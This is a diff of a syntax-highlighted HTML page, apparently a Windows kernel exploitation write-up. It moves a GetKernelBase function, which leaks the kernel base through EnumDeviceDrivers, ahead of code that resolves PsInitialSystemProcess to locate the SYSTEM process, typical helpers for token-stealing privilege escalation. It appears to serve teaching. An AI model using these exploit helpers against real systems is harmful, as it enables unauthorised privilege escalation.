@@ -1334,6 +1334,14 @@ PROCESS ffffba09b847a040
     </span><span class="o">return</span><span class="p"> output;
 }
 
+</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
+    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
+    </span><span class="na">DWORD</span><span class="p"> cbNeeded;
+    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
+
+    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
+}
+
 </span><span class="na">QWORD GetSystemEProcess</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
     </span><span class="na">HMODULE</span><span class="p"> hKernel </span><span class="o">= </span><span class="p">LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);
     </span><span class="na">HANDLE</span><span class="p"> psInitialProcess</span><span class="o"> =</span><span class="p"> GetProcAddress(hKernel, </span><span class="s">"PsInitialSystemProcess"</span><span class="p">);
@@ -1363,14 +1371,6 @@ PROCESS ffffba09b847a040
     }
 
     </span><span class="o">return</span><span class="p"> currentEProcess;
-}
-
-</span><span class="na">QWORD</span><span class="na"> GetKernelBase</span><span class="p">() {
-    </span><span class="na">LPVOID</span><span class="p"> drivers[</span><span class="mi">1024</span><span class="p">];
-    </span><span class="na">DWORD</span><span class="p"> cbNeeded;
-    EnumDeviceDrivers(drivers, </span><span class="o">sizeof</span><span class="p">(drivers),</span><span class="o"> &</span><span class="p">cbNeeded);
-
-    </span><span class="o">return</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) drivers[</span><span class="mi">0</span><span class="p">];
 }
 
 </span><span class="no">int</span><span class="na"> main</span><span class="p">() {
